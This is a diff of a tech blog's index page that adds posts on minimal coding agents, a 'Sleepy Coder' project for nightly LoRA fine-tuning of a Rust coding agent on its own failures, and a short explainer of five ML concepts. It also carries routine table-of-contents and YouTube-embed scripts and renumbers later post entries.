+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+  <li>
+    <p><strong>Less is more.</strong> Four tools plus extensions beats dozens of built-in features.</p>
+  </li>
+  <li>
+    <p><strong>LLMs write code.</strong> Embrace it instead of fighting it.</p>
+  </li>
+  <li>
+    <p><strong>Extensions over features.</strong> Let agents build their own tools.</p>
+  </li>
+  <li>
+    <p><strong>The future is minimal.</strong> OpenClaw’s growth suggests this approach wins.</p>
+  </li>
+</ol>
+
+<h2 id="resources">Resources</h2>
+
+<ul>
+  <li><a href="https://github.com/badlogic/pi-mono">Pi Mono Repository</a></li>
+  <li><a href="https://github.com/mitsuhiko/agent-stuff">Armin’s Extensions</a></li>
+  <li><a href="https://lucumr.pocoo.org/2026/1/31/pi/">Pi: The Minimal Agent (lucumr.pocoo.org)</a></li>
+  <li><a href="https://github.com/badlogic/pi-mono">mcporter MCP Bridge</a></li>
+</ul>
+
+<hr />
+
+<p><em>Minimal agents, maximum impact. Four tools to rule them all.</em></p>
+
+          </div>
+
+
+
+
+
+<img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="4"><p class="post-meta">March 30, 2026 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">926 words</span> &bull; <span class="post-read-time">5 min read</span></em></p><h3>
+          <a class="post-link" href="/2026/03/30/sleepy-coder-continual-learning/">
+            Sleepy Coder: Teaching AI Agents to Learn from Their Mistakes
+          </a>
+        </h3><nav class="toc" data-toc-id="sleepy-coder-continual-learning">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/sleeper-dreaming.png" class="post-marker" alt="" /></p>
+
+<p>What if your AI coding assistant could learn from its mistakes—not just for one session, but across training cycles?</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Paper</strong></td>
+        <td><a href="https://arxiv.org/abs/2602.06043">Share: Shared LoRA Subspaces</a></td>
+      </tr>
+      <tr>
+        <td><strong>Code</strong></td>
+        <td><a href="https://github.com/softwarewrighter/sleepy-coder">sleepy-coder</a></td>
+      </tr>
+      <tr>
+        <td><strong>Video</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="references">References</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Concept</th>
+      <th>Reference</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Share</strong></td>
+      <td><a href="https://arxiv.org/abs/2602.06043">Shared LoRA Subspaces for almost Strict Continual Learning</a> (Kaushik et al., Johns Hopkins 2026)</td>
+    </tr>
+    <tr>
+      <td><strong>UWSH</strong></td>
+      <td><a href="https://arxiv.org/abs/2512.05117">Universal Weight Subspace Hypothesis</a> (Kaushik et al., Johns Hopkins 2025)</td>
+    </tr>
+    <tr>
+      <td><strong>LoRA</strong></td>
+      <td><a href="https://arxiv.org/abs/2106.09685">Low-Rank Adaptation of Large Language Models</a> (Hu et al., Microsoft 2021)</td>
+    </tr>
+  </tbody>
+</table>
+
+<div style="display:none">
+
+</div>
+
+<h2 id="the-problem">The Problem</h2>
+
+<p>AI coding agents have a memory problem. They fix a bug today, then make the same mistake next week. Every session starts from the same frozen model. Nothing carries forward.</p>
+
+<p>Current agents are stateless learners—they can use tools, follow instructions, and generate code, but they don’t improve from experience. The model that struggles with borrow checker errors on Monday is equally confused by Friday.</p>
+
+<h2 id="sleep-learning">Sleep Learning</h2>
+
+<p>The idea is simple: learn while you sleep.</p>
+
+<p><strong>Day phase</strong>: The agent works on coding tasks. We log its failures—the error messages, the broken code, and the fixes that eventually worked.</p>
+
+<p><strong>Sleep phase</strong>: Overnight, we fine-tune the model on those failures using parameter-efficient methods (LoRA).</p>
+
+<p><strong>Eval phase</strong>: We test for improvement on new tasks and regression on old ones. Only if tests pass do we promote the new checkpoint.</p>
+
+<p>Each morning, a new model wakes up a little better than before.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+│   DAY LOOP  │     │ SLEEP LOOP  │     │  EVAL LOOP  │
+│ (Rust Agent)│ --&gt; │(Python Train)│ --&gt; │ (Rust Eval) │
+└─────────────┘     └─────────────┘     └─────────────┘
+       |                   |                   |
+       v                   v                   v
+┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+│episodes.sqlite│   │  adapter/   │     │metrics.jsonl│
+│  (capture)  │     │(LoRA weights)│    │  (results)  │
+└─────────────┘     └─────────────┘     └─────────────┘
+</code></pre></div></div>
+
+<h2 id="why-this-might-work">Why This Might Work</h2>
+
+<p>Two recent papers from Johns Hopkins University (Kaushik, Chaudhari, Vaidya, Chellappa, Yuille, 2025-2026) suggest this approach is grounded in solid theory:</p>
+
+<h3 id="share-shared-lora-subspaces">Share: Shared LoRA Subspaces</h3>
+
+<p>The <a href="https://arxiv.org/abs/2602.06043">Share paper</a> shows that continual LoRA training can work with a single evolving shared low-rank basis. Instead of keeping separate adapters for each task, you:</p>
+
+<ol>
+  <li>Build a shared basis from past task adapters (via SVD)</li>
+  <li>Store only tiny per-task coefficients</li>
+  <li>Expand the basis when new tasks don’t fit</li>
+</ol>
+
+<p>This dramatically reduces storage and enables knowledge transfer between related tasks.</p>
+
+<h3 id="uwsh-universal-weight-subspace-hypothesis">UWSH: Universal Weight Subspace Hypothesis</h3>
+
+<p>The <a href="https://arxiv.org/abs/2512.05117">UWSH paper</a> goes further: models of the same architecture naturally converge to similar low-dimensional spectral subspaces. These subspaces are stable across tasks, initializations, and even modalities.</p>
+
+<p>The implication: continual learning might mostly be coefficient updates in a frozen basis, not constant retraining.</p>
+
+<h2 id="the-architecture">The Architecture</h2>
+
+<p>Sleepy Coder uses a dual-language design:</p>
+
+<p><strong>Rust</strong> handles the agent runtime, episode capture, and evaluation. Rust gives us determinism and reproducibility—critical for measuring improvement.</p>
+
+<p><strong>Python</strong> handles training, embeddings, and visualization. The HuggingFace/PEFT ecosystem makes parameter-efficient fine-tuning straightforward.</p>
+
+<h3 id="task-system">Task System</h3>
+
+<p>We use “Rust Koans”—small buggy code snippets that exercise common error patterns:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Error Family</th>
+      <th>Example</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Borrow checker</td>
+      <td>Moved values, dangling borrows</td>
+    </tr>
+    <tr>
+      <td>Lifetimes</td>
+      <td>Missing annotations</td>
+    </tr>
+    <tr>
+      <td>Trait bounds</td>
+      <td>Missing implementations</td>
+    </tr>
+    <tr>
+      <td>Result handling</td>
+      <td>Unwrap/? misuse</td>
+    </tr>
+    <tr>
+      <td>Type mismatch</td>
+      <td>Iterator types, generics</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Each task has buggy code, expected error, and correct fix—enabling automated evaluation.</p>
+
+<h3 id="episode-capture">Episode Capture</h3>
+
+<p>Every agent interaction is logged:</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pub</span> <span class="k">struct</span> <span class="n">Episode</span> <span class="p">{</span>
+    <span class="k">pub</span> <span class="n">task_id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">error_signature</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>  <span class="c1">// normalized</span>
+    <span class="k">pub</span> <span class="n">diff_unified</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>     <span class="c1">// the fix</span>
+    <span class="k">pub</span> <span class="n">passed</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
+    <span class="k">pub</span> <span class="n">steps_to_green</span><span class="p">:</span> <span class="nb">u32</span><span class="p">,</span>
+    <span class="c1">// ...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Error signatures are normalized to enable clustering and repeat detection.</p>
+
+<h3 id="gated-promotion">Gated Promotion</h3>
+
+<p>Not every training run produces a better model. We gate deployment on:</p>
+
+<ul>
+  <li><strong>Repeat error rate</strong>: Does the agent make the same mistakes?</li>
+  <li><strong>Steps to green</strong>: How many attempts to solve tasks?</li>
+  <li><strong>Regression check</strong>: Does a frozen suite still pass?</li>
+</ul>
+
+<p>Only models that improve without regressing get promoted.</p>
+
+<h2 id="current-status">Current Status</h2>
+
+<p>This project is work in progress. The infrastructure is largely built, but we don’t have conclusive results yet.</p>
+
+<p><strong>Done:</strong></p>
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Agent runtime (Rust)</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Episode capture (SQLite)</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Task generator (Rust Koans)</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />LoRA training pipeline (Python)</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Evaluation harness (Rust)</li>
+</ul>
+
+<p><strong>In Progress:</strong></p>
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Running multi-day experiments</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Measuring repeat error rates</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Testing Share-style consolidation</li>
+</ul>
+
+<p><strong>Open Questions:</strong></p>
+<ul>
+  <li>How many sleep cycles before measurable improvement?</li>
+  <li>Does the shared basis approach scale?</li>
+  <li>What’s the optimal task curriculum?</li>
+</ul>
+
+<h2 id="why-this-matters">Why This Matters</h2>
+
+<p>If sleep learning works, it changes how we think about AI agents:</p>
+
+<ol>
+  <li><strong>Agents could specialize</strong> to your codebase, your error patterns, your style</li>
+  <li><strong>Mistakes become training data</strong>, not just frustration</li>
+  <li><strong>Small models could outperform large ones</strong> on familiar tasks</li>
+  <li><strong>Continual improvement</strong> replaces periodic retraining</li>
+</ol>
+
+<p>This is what “learning from experience” should mean for AI.</p>
+
+<h2 id="whats-next">What’s Next</h2>
+
+<p>We’re running experiments now. Follow for updates as we collect results.</p>
+
+<p>The code is open source—contributions welcome.</p>
+
+<hr />
+
+<p><em>Sleepy Coder: Parameter-efficient continual learning for AI coding agents.</em></p>
+
+          </div>
+
+
+
+
+
+<img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="5"><p class="post-meta">February 23, 2026 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">468 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: VAEs (generative with structured latents), Uncertainty Estimation (know when you don't know), Interpretability (distributed representations resist explanation), Gradient Noise (mini-batch variation), Human-in-the-Loop (human oversight for critical decisions).</div><h3>
+          <a class="post-link" href="/2026/02/23/five-ml-concepts-20/">
+            Five ML Concepts - #20
+          </a>
+        </h3><nav class="toc" data-toc-id="five-ml-concepts-20">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/block-twenty.png" class="post-marker" alt="" /></p>
+
+<p>5 machine learning concepts. Under 30 seconds each.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Papers</strong></td>
+        <td>Links in References section</td>
+      </tr>
+      <tr>
+        <td><strong>Video</strong></td>
+        <td><a href="https://www.youtube.com/shorts/OklW3RTV3I4">Five ML Concepts #20</a><br /><a href="https://www.youtube.com/shorts/OklW3RTV3I4"><img src="https://img.youtube.com/vi/OklW3RTV3I4/mqdefault.jpg" alt="Video" class="video-thumb" /></a></td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<div class="references-section">
+
+  <h2 id="references">References</h2>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Concept</th>
+        <th>Reference</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>VAEs</strong></td>
+        <td><a href="https://arxiv.org/abs/1312.6114">Auto-Encoding Variational Bayes</a> (Kingma &amp; Welling 2013)</td>
+      </tr>
+      <tr>
+        <td><strong>Uncertainty Estimation</strong></td>
+        <td><a href="https://arxiv.org/abs/1703.04977">What Uncertainties Do We Need in Bayesian Deep Learning?</a> (Kendall &amp; Gal 2017)</td>
+      </tr>
+      <tr>
+        <td><strong>Interpretability</strong></td>
+        <td><a href="https://arxiv.org/abs/1702.08608">Towards A Rigorous Science of Interpretable Machine Learning</a> (Doshi-Velez &amp; Kim 2017)</td>
+      </tr>
+      <tr>
+        <td><strong>Gradient Noise</strong></td>
+        <td><a href="https://arxiv.org/abs/1704.04289">Stochastic Gradient Descent as Approximate Bayesian Inference</a> (Mandt et al. 2017)</td>
+      </tr>
+      <tr>
+        <td><strong>Human-in-the-Loop</strong></td>
+        <td><a href="https://www.manning.com/books/human-in-the-loop-machine-learning">Human-in-the-Loop Machine Learning</a> (Monarch 2021)</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="todays-five">Today’s Five</h2>
+
+<h3 id="1-variational-autoencoders-vaes">1. Variational Autoencoders (VAEs)</h3>
+
+<p><strong>VAEs are probabilistic autoencoders that learn a structured latent distribution.</strong> By sampling from that distribution, they can generate new examples similar to the training data.</p>
+
+<p>The key innovation is regularizing the latent space to be smooth and continuous.</p>
+
+<blockquote>
+  <p>Like learning not just to summarize books, but to create new ones in a similar style.</p>
+</blockquote>
+
+<h3 id="2-uncertainty-estimation">2. Uncertainty Estimation</h3>
+
+<p><strong>Models can estimate how confident they should be in predictions.</strong> Some uncertainty comes from noisy data (aleatoric), and some from limited knowledge (epistemic).</p>
+
+<p>Knowing when a model is uncertain enables safer decision-making.</p>
+
+<blockquote>
+  <p>Like a weather forecast giving seventy percent chance of rain instead of a simple yes or no.</p>
+</blockquote>
+
+<h3 id="3-why-interpretability-is-hard">3. Why Interpretability Is Hard</h3>
+
+<p><strong>Neural networks represent information across many interacting parameters.</strong> No single component cleanly maps to a human concept.</p>
+
+<p>Distributed representations enable powerful learning but resist simple explanations.</p>
+
+<blockquote>
+  <p>Like trying to explain a dream by pointing to individual neurons.</p>
+</blockquote>
+
+<h3 id="4-gradient-noise">4. Gradient Noise</h3>
+
+<p><strong>When training with mini-batches, gradients vary from step to step.</strong> A little noise can help exploration, but too much can slow convergence.</p>
+
+<p>Batch size, learning rate, and gradient clipping all influence this noise level.</p>
+
+<blockquote>
+  <p>Like getting slightly different directions each time you ask for help.</p>
+</blockquote>
+
+<h3 id="5-human-in-the-loop-systems">5. Human-in-the-Loop Systems</h3>
+
+<p><strong>Humans review, supervise, or override model decisions in critical workflows.</strong> This improves safety and accountability in high-stakes applications.</p>
+
+<p>The approach combines model efficiency with human judgment where it matters most.</p>
+
+<blockquote>
+  <p>Like a pilot monitoring autopilot and stepping in when necessary.</p>
+</blockquote>
+
+<h2 id="quick-reference">Quick Reference</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Concept</th>
+      <th>One-liner</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>VAEs</strong></td>
+      <td>Generative models with structured latent spaces</td>
+    </tr>
+    <tr>
+      <td><strong>Uncertainty Estimation</strong></td>
+      <td>Know when you don’t know</td>
+    </tr>
+    <tr>
+      <td><strong>Interpretability</strong></td>
+      <td>Distributed representations resist explanation</td>
+    </tr>
+    <tr>
+      <td><strong>Gradient Noise</strong></td>
+      <td>Mini-batch variation in training</td>
+    </tr>
+    <tr>
+      <td><strong>Human-in-the-Loop</strong></td>
+      <td>Human oversight for critical decisions</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<p><em>Part 20 of the Five ML Concepts series. <a href="/series/#five-ml-concepts">View all parts</a></em></p>
+
+<p><em>Short, accurate ML explainers. Follow for more.</em></p>
+
+          </div>
+
+
+
+
+
+<div class="youtube-embed-container" id="yt-container-OklW3RTV3I4">
+  <h3>Watch the Video</h3>
+  <div class="youtube-embed-wrapper">
+    <iframe
+      id="yt-player-OklW3RTV3I4"
+      src="https://www.youtube.com/embed/OklW3RTV3I4?enablejsapi=1&mute=1&autoplay=1&cc_load_policy=1"
+      title="YouTube video player"
+      frameborder="0"
+      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+      allowfullscreen
+      loading="lazy">
+    </iframe>
+  </div>
+  <p class="youtube-embed-note">Unmute to hear narration.</p>
+</div>
+
+<style>
+.youtube-embed-container {
+  margin: 2rem auto;
+  padding: 1.5rem;
+  background: var(--code-background-color, #f5f5f5);
+  border-radius: 8px;
+  width: 66%;
+}
+
+.youtube-embed-container h3 {
+  margin-top: 0;
+  margin-bottom: 1rem;
+}
+
+.youtube-embed-wrapper {
+  position: relative;
+  width: 100%;
+  padding-bottom: 56.25%; /* 16:9 aspect ratio */
+  height: 0;
+  overflow: hidden;
+}
+
+.youtube-embed-wrapper iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  border-radius: 4px;
+}
+
+.youtube-embed-note {
+  margin-top: 0.75rem;
+  margin-bottom: 0;
+  font-size: 0.85rem;
+  color: var(--text-muted-color, #666);
+  font-style: italic;
+}
+</style>
+
+<script>
+(function() {
+  const containerId = 'yt-container-OklW3RTV3I4';
+  const playerId = 'yt-player-OklW3RTV3I4';
+
+  // Load YouTube IFrame API if not already loaded
+  if (!window.YT) {
+    const tag = document.createElement('script');
+    tag.src = 'https://www.youtube.com/iframe_api';
+    const firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+  }
+
+  let player;
+  let isPlaying = false;
+
+  function onYouTubeIframeAPIReady() {
+    player = new YT.Player(playerId, {
+      events: {
+        'onReady': onPlayerReady
+      }
+    });
+  }
+
+  function onPlayerReady(event) {
+    setupIntersectionObserver();
+  }
+
+  function setupIntersectionObserver() {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting && entry.intersectionRatio >= 0.5) {
+          if (!isPlaying && player && player.playVideo) {
+            player.playVideo();
+            isPlaying = true;
+          }
+        } else {
+          if (isPlaying && player && player.pauseVideo) {
+            player.pauseVideo();
+            isPlaying = false;
+          }
+        }
+      });
+    }, {
+      threshold: [0.5]
+    });
+
+    observer.observe(container);
+  }
+
+  // Handle API ready callback
+  if (window.YT && window.YT.Player) {
+    onYouTubeIframeAPIReady();
+  } else {
+    window.onYouTubeIframeAPIReady = window.onYouTubeIframeAPIReady || onYouTubeIframeAPIReady;
+    // Queue multiple players if needed
+    const existingCallback = window.onYouTubeIframeAPIReady;
+    window.onYouTubeIframeAPIReady = function() {
+      if (existingCallback) existingCallback();
+      onYouTubeIframeAPIReady();
+    };
+  }
+})();
+</script>
+
+<img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="6"><p class="post-meta">February 22, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">643 words</span> &bull; <span class="post-read-time">4 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">ICL evolved from emergent surprise (2020) to mechanistic understanding (2022) to engineered capability (2026). Transformers implement implicit gradient descent during inference---they learn without weight updates. The frontier: models learning from their own feedback. Not magic. Meta-learning in plain sight.</div><h3>
           <a class="post-link" href="/2026/02/22/icl-revisited-from-mystery-to-engineering/">
             In-Context Learning Revisited: From Mystery to Engineering
@@ -693,7 +3651,7 @@
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="1"><p class="post-meta">February 22, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="7"><p class="post-meta">February 22, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">473 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Autoencoders (compress and reconstruct), Correlation vs Causation (co-occurrence isn't cause), Curriculum Learning (easy to hard), Failure Analysis (categorize errors), Covariate Shift (new inputs, same task).</div><h3>
           <a class="post-link" href="/2026/02/22/five-ml-concepts-19/">
             Five ML Concepts - #19
@@ -1153,7 +4111,7 @@
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="2"><p class="post-meta">February 21, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="8"><p class="post-meta">February 21, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">2251 words</span> &bull; <span class="post-read-time">12 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">JSON is everywhere, but it's not the only option. This post explores data formats beyond basic JSON—JSONL for streaming, JSONB for fast queries, Protocol Buffers for compact wire formats, YAML/TOML for human editing, and TOON for LLM efficiency. Each has trade-offs: pick two of readability, compactness, or speed.</div><h3>
           <a class="post-link" href="/2026/02/21/json-et-al-data-serialization-formats/">
             JSON et al: A Deep Dive into Data Serialization Formats
@@ -2180,7 +5138,7 @@ Bob,30
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="3"><p class="post-meta">February 21, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="9"><p class="post-meta">February 21, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">466 words</span> &bull; <span class="post-read-time">3 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Five ML concepts in under 30 seconds each: Preference Learning (train from comparisons), Ensembling (combine models for robustness), ML Fragility (breaks on distribution shift), Epoch (one pass through data), Cost vs Quality (bigger isn't always better).</div><h3>
           <a class="post-link" href="/2026/02/21/five-ml-concepts-18/">
             Five ML Concepts - #18
@@ -2640,7 +5598,7 @@ Bob,30
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
-      </li><li class="post-item" data-index="4"><p class="post-meta">February 20, 2026 &bull; Software Wrighter</p>
+      </li><li class="post-item" data-index="10"><p class="post-meta">February 20, 2026 &bull; Software Wrighter</p>
 <p class="post-reading-info"><em><span class="post-word-count">970 words</span> &bull; <span class="post-read-time">5 min read</span></em> &bull; <span class="abstract-toggle" onclick="this.classList.toggle('open'); this.parentElement.nextElementSibling.classList.toggle('open')">Abstract</span></p><div class="post-meta-abstract">Personal Software via Vibe Coding: a music tool for AI agents. midi-cli-rs provides mood presets (suspense, upbeat, calm, jazz) so agents can generate complete audio compositions from simple commands. No music theory required.</div><h3>
           <a class="post-link" href="/2026/02/20/midi-cli-rs-music-for-ai-agents/">
             midi-cli-rs: Music Generation for AI Coding Agents
@@ -3192,7 +6150,7 @@ cargo build <span class="nt">--release</span>
 </script>
 
 <img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
